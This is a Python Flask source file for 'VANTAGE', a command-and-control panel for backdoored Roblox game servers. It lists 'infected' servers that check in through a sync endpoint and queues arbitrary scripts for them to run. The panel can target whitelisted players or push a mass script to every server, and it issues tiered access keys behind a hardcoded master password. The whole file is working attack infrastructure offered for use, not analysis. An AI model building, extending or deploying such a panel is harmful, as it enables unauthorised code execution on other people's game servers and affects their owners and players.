import requests, time, os, uuid, random, string
from flask import Flask, request, render_template_string, jsonify, session, redirect, url_for

app = Flask(__name__)
app.secret_key = "vantage_v30_final_tier"
MASTER_ADMIN_PW = "SkibidiToiletSigmaRizzler" 

global_servers = {} 
user_sessions = {}
valid_keys = {}
mass_execute_queue = []

def generate_key(k_type="standard"):
    k = "VANTAGE-" + ''.join(random.choices(string.ascii_uppercase + string.digits, k=10))
    valid_keys[k] = k_type
    return k

# Added mobile support and privacy CSS to your original styles
BASE_CSS = """
:root { --gold: #ffd700; --bg: #050505; --card: rgba(15, 15, 15, 0.9); --border: rgba(255, 215, 0, 0.2); --accent: #bc13fe; }
* { box-sizing: border-box; transition: 0.3s; }
body { background: var(--bg); color: #fff; font-family: 'Segoe UI', sans-serif; margin: 0; height: 100vh; overflow: hidden; display: flex; flex-direction: column; }
.navbar { background: rgba(0,0,0,0.95); border-bottom: 2px solid var(--border); display: flex; justify-content: space-around; padding: 18px; z-index: 100; flex-wrap: wrap; }
.nav-item { color: #444; cursor: pointer; font-weight: 900; font-size: 11px; text-transform: uppercase; letter-spacing: 2px; }
.active-nav { color: var(--gold); border-bottom: 2px solid var(--gold); text-shadow: 0 0 10px var(--gold); }
.viewport { flex: 1; padding: 25px; overflow-y: auto; }
.card { background: var(--card); border: 1px solid var(--border); padding: 20px; border-radius: 15px; backdrop-filter: blur(15px); margin-bottom: 15px; }
.grid { display: grid; grid-template-columns: repeat(auto-fill, minmax(250px, 1fr)); gap: 20px; max-width: 1200px; margin: auto; }
.server-thumb { width: 100%; height: 130px; object-fit: cover; border-radius: 10px; border: 1px solid #222; margin-bottom: 10px; display: block; }
.server-info { font-size: 11px; margin-bottom: 8px; line-height: 1.4; }
.server-info b { color: var(--gold); }
.btn { background: var(--gold); color: #000; border: none; padding: 14px; border-radius: 10px; font-weight: 900; cursor: pointer; width: 100%; text-transform: uppercase; font-size: 11px; margin-top: 5px; }
.btn:hover { transform: translateY(-2px); box-shadow: 0 5px 15px rgba(255, 215, 0, 0.3); }
input, textarea { background: rgba(0,0,0,0.8); border: 1px solid var(--border); padding: 15px; color: #fff; width: 100%; border-radius: 12px; outline: none; margin-bottom: 10px; }
textarea { color: #0f0; font-family: 'Consolas', monospace; height: 250px; resize: none; border-left: 5px solid var(--gold); }
.hidden { display: none !important; }
.key-badge { background: #111; padding: 8px; border-radius: 5px; font-family: monospace; border: 1px solid var(--gold); font-size: 11px; margin-top: 5px; display: block; width: fit-content; }
.privacy-active .server-thumb { filter: blur(6px); } /* Adjusted blur */
.privacy-active .game-name-text { filter: blur(4px); } 

@media (max-width: 600px) {
    .grid { grid-template-columns: 1fr 1fr; gap: 10px; }
    .viewport { padding: 15px; }
    .nav-item { font-size: 9px; }
}
"""

DASH_HTML = """
<!DOCTYPE html><html><head><meta name="viewport" content="width=device-width, initial-scale=1.0"><style>""" + BASE_CSS + """</style></head>
<body>
    {% if not logged_in %}
    <div style="display:flex; align-items:center; justify-content:center; height:100vh;">
        <div class="card" style="width:340px; text-align:center;">
            <h1 style="color:var(--gold);">VANTAGE</h1>
            <form method="POST" action="/login"><input type="password" name="pw" placeholder="ACCESS KEY"><button class="btn">LOGIN</button></form>
        </div>
    </div>
    {% else %}
    <div class="navbar">
        <div class="nav-item active-nav" onclick="tab('live', this)">Infected</div>
        <div class="nav-item" onclick="tab('exec', this)">Executor</div>
        <div class="nav-item" onclick="tab('white', this)">Whitelist</div>
        {% if is_admin and not is_master %}<div class="nav-item" style="color:#bc13fe;" onclick="tab('admin_panel', this)">Admin Panel</div>{% endif %}
        {% if is_master %}<div class="nav-item" style="color:#ff4444;" onclick="tab('master', this)">Master Panel</div>{% endif %}
    </div>
    <div class="viewport">
        <div id="live" class="tab">
            <button class="btn" style="width:auto; margin-bottom:15px; padding: 10px 20px;" onclick="togglePrivacy()">Privacy Mode</button>
            <div id="server_grid" class="grid"></div>
        </div>
        <div id="exec" class="tab hidden"><div class="card" style="max-width: 700px; margin: auto;"><p style="font-size:11px;">TARGET: <b id="exec_target" style="color:var(--gold);">NONE</b></p><textarea id="code_area" placeholder="-- SCRIPT HERE"></textarea><button class="btn" onclick="execute()">EXECUTE</button></div></div>
        <div id="white" class="tab hidden"><div class="card" style="max-width: 400px; margin: auto; text-align: center;"><input id="w_input" placeholder="Username"><button id="w_btn" class="btn" onclick="addWhite()">WHITELIST</button><div id="profile_box" class="hidden" style="margin-top:20px;"><img id="p_img" src="" style="width:80px; border-radius:50%;"><h3 id="p_name"></h3><button class="btn" style="background:#ff4444; color:#fff;" onclick="resetWhite()">RESET</button></div></div></div>
        
        {% if is_admin and not is_master %}
        <div id="admin_panel" class="tab hidden">
            <div class="card" style="max-width: 500px; margin: auto; text-align: center;">
                <h2 style="color:#bc13fe;">Admin Panel</h2>
                <button class="btn" onclick="genKey('standard', 'key_list_admin')">GEN STANDARD KEY</button>
                <div id="key_list_admin" style="margin-top:10px;"></div>
            </div>
        </div>
        {% endif %}

        {% if is_master %}
        <div id="master" class="tab hidden">
            <div class="card" style="max-width: 600px; margin: auto; text-align: center;">
                <h2 style="color:#ff4444;">Master Controls</h2>
                <textarea id="mass_code" style="height:100px;" placeholder="-- MASS SCRIPT (ALL SERVERS)"></textarea>
                <button class="btn" style="background:#ff4444; color:#fff;" onclick="massExec()">SEND TO ALL</button>
                <hr style="border:0; border-top:1px solid #222; margin:20px 0;">
                <div style="display:flex; gap:10px;">
                    <button class="btn" onclick="genKey('standard', 'key_list_master')">GEN STANDARD</button>
                    <button class="btn" style="background:#bc13fe; color:#fff;" onclick="genKey('admin', 'key_list_master')">GEN ADMIN</button>
                </div>
                <div id="key_list_master" style="margin-top:10px; display: flex; flex-direction: column; align-items: center;"></div>
            </div>
        </div>
        {% endif %}
    </div>
    {% endif %}
<script>
    let privacyOn = false;
    function togglePrivacy() { privacyOn = !privacyOn; sync(); }

    function tab(name, el) { document.querySelectorAll('.tab').forEach(t => t.classList.add('hidden')); document.querySelectorAll('.nav-item').forEach(n => n.classList.remove('active-nav')); document.getElementById(name).classList.remove('hidden'); el.classList.add('active-nav'); }
    function sync() {
        fetch('/api/global_signals').then(r => r.json()).then(data => {
            let sHtml = "";
            let grid = document.getElementById('server_grid');
            if (privacyOn) grid.classList.add('privacy-active'); else grid.classList.remove('privacy-active');

            if (Object.keys(data.servers).length === 0) {
                sHtml = `<div style="text-align:center; padding:40px; color:var(--gold); font-weight:900; grid-column: 1/-1;">No infected yet, please wait...</div>`;
            } else {
                for(let id in data.servers) { 
                    let s = data.servers[id]; 
                    sHtml += `<div class="card"><img src="${s.thumb}" class="server-thumb"><div class="server-info"><b>GAME:</b> <span class="game-name-text">${s.name}</span><br><b>OWNER:</b> ${s.owner}<br><b>PLRS:</b> ${s.p_count}</div><button class="btn" onclick="window.location='roblox-player:1+launchmode:play+gameinstanceid:${id}+placeid:${s.place_id}'">JOIN</button></div>`; 
                }
            }
            grid.innerHTML = sHtml;
        });
        fetch('/api/personal_data').then(r => r.json()).then(data => {
            if(data.whitelist) { document.getElementById('exec_target').innerText = data.whitelist.name; document.getElementById('p_img').src = data.whitelist.img; document.getElementById('p_name').innerText = data.whitelist.name; document.getElementById('profile_box').classList.remove('hidden'); document.getElementById('w_input').classList.add('hidden'); document.getElementById('w_btn').classList.add('hidden');
            } else { document.getElementById('exec_target').innerText = "NONE"; document.getElementById('profile_box').classList.add('hidden'); document.getElementById('w_input').classList.remove('hidden'); document.getElementById('w_btn').classList.remove('hidden'); }
        });
    }
    function genKey(type, targetId) { fetch('/api/admin/gen_key', {method:'POST', headers:{'Content-Type':'application/json'}, body:JSON.stringify({type: type})}).then(r => r.json()).then(data => { document.getElementById(targetId).innerHTML += `<span class="key-badge" style="border-color:${type=='admin'?'#bc13fe':'var(--gold)'}">${data.key}</span>`; }); }
    function massExec() { fetch('/api/admin/mass_execute', {method:'POST', headers:{'Content-Type':'application/json'}, body:JSON.stringify({code: document.getElementById('mass_code').value})}).then(()=>alert("MASS SENT")); }
    function addWhite() { fetch('/api/whitelist', {method:'POST', headers:{'Content-Type':'application/json'}, body:JSON.stringify({user: document.getElementById('w_input').value})}).then(sync); }
    function resetWhite() { fetch('/api/reset', {method:'POST'}).then(sync); }
    function execute() { fetch('/api/execute', {method:'POST', headers:{'Content-Type':'application/json'}, body:JSON.stringify({code: document.getElementById('code_area').value})}); }
    if (document.getElementById('server_grid')) setInterval(sync, 2500);
</script></body></html>
"""

@app.route('/')
def index(): return render_template_string(DASH_HTML, logged_in=session.get('logged_in'), is_master=session.get('is_master'), is_admin=session.get('is_admin'))

@app.route('/login', methods=['POST'])
def login():
    pw = request.form.get("pw")
    if pw == MASTER_ADMIN_PW:
        session.update({'logged_in': True, 'is_master': True, 'is_admin': True, 'sid': 'MASTER_SESSION'})
    elif pw in valid_keys:
        k_type = valid_keys[pw]
        session.update({'logged_in': True, 'is_master': False, 'is_admin': (k_type == 'admin'), 'sid': str(uuid.uuid4())})
        del valid_keys[pw]
    return redirect(url_for('index'))

@app.route('/api/admin/gen_key', methods=['POST'])
def admin_gen():
    if not session.get('is_admin'): return jsonify({}), 403
    return jsonify({"key": generate_key(request.json.get("type", "standard"))})

@app.route('/api/admin/mass_execute', methods=['POST'])
def admin_mass():
    if session.get('is_master'): mass_execute_queue.append(request.json.get("code"))
    return jsonify({"ok": True})

@app.route('/api/global_signals')
def get_global(): return jsonify({"servers": global_servers})

@app.route('/api/personal_data')
def get_personal(): 
    sid = session.get('sid')
    if sid not in user_sessions: user_sessions[sid] = {"whitelist": None, "queue": []}
    return jsonify(user_sessions[sid])

@app.route('/api/whitelist', methods=['POST'])
def add_white():
    sid, user = session.get('sid'), request.json.get("user")
    try:
        r = requests.post("https://users.roblox.com/v1/usernames/users", json={"usernames": [user]}).json()
        if r.get("data") and sid:
            uid, name = r["data"][0]["id"], r["data"][0]["requestedUsername"]
            img = requests.get(f"https://thumbnails.roblox.com/v1/users/avatar-headshot?userIds={uid}&size=150x150&format=Png").json()["data"][0]["imageUrl"]
            user_sessions[sid] = {"whitelist": {"name": name, "img": img}, "queue": []}
    except: pass
    return jsonify({"ok": True})

@app.route('/api/reset', methods=['POST'])
def reset_white():
    if session.get('sid') in user_sessions: user_sessions[session.get('sid')]["whitelist"] = None
    return jsonify({"ok": True})

@app.route('/api/execute', methods=['POST'])
def run_exec():
    if session.get('sid') in user_sessions: user_sessions[session.get('sid')]["queue"].append(request.json.get("code"))
    return jsonify({"ok": True})

@app.route('/roblox/sync', methods=['POST'])
def roblox_sync():
    global mass_execute_queue
    data = request.json
    jid = data.get("jobId")
    if not jid: return jsonify({"commands": []})

    if jid not in global_servers:
        try:
            t = requests.get(f"https://thumbnails.roblox.com/v1/places/gameicons?placeIds={data.get('game_id')}&size=150x150&format=Png").json()
            thumb_url = t["data"][0]["imageUrl"] if t.get("data") else ""
        except: thumb_url = ""
        global_servers[jid] = {"thumb": thumb_url, "place_id": data.get("game_id")}
    
    global_servers[jid].update({"name": data.get("name"), "owner": data.get("owner"), "p_count": len(data.get("players", [])), "last_ping": time.time()})
    
    # Cleanup dead servers
    dead = [k for k, v in global_servers.items() if time.time() - v.get('last_ping', 0) > 20]
    for k in dead: del global_servers[k]

    all_cmds = []
    for mc in mass_execute_queue: all_cmds.append({"user": "ALL", "code": mc})
    if mass_execute_queue: mass_execute_queue = []

    players = [p.lower() for p in data.get("players", [])]
    for sid, info in user_sessions.items():
        if info.get("whitelist") and info["whitelist"]["name"].lower() in players:
            for c in info["queue"]: all_cmds.append({"user": info["whitelist"]["name"], "code": c})
            user_sessions[sid]["queue"] = []
    return jsonify({"commands": all_cmds})

@app.route('/logout')
def logout(): session.clear(); return redirect(url_for('index'))

if __name__ == '__main__':
    port = int(os.environ.get("PORT", 5000))
    app.run(host='0.0.0.0', port=port)
